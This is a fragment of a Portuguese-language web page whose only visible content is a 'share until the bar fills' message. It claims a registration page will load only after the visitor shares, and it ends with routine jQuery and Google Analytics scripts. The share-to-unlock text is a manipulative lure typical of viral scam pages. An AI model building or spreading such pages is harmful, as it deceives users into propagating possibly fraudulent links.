<font color="white"><h3 id="subdesc1" class="show"><br><center><b>Compartilhe até completar a barrinha abaixo</b><br> Apenas após o compartilhamento a página de cadastro será carregada!</center></h3>

<input type="hidden" id="number" value="0">
<br>
			<div class="progress">
				<span aria-valuenow="1" aria-valuemin="1%" aria-valuemax="100%" style="width: 1%; max-width: 100%;" id="progressbar"></span>
			</div>
                  </div><br/><br/>

			
			<div><div class="clear-fix"></div></div>
        </div>
    </section>
     

<div class='fbcoms'>
	
	<center>

</center><br/>
    
<br><br>
</div>
	

    <script type="text/javascript" src="files/jquery.min.js.download"></script>
    <script src="files/show_hide.js.download"></script>
    <script>
    $("#q3").click(function () {
      $('#remover').remove();
    });
    </script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-112494972-1', 'auto');
  ga('send', 'pageview');

</script>

</html>
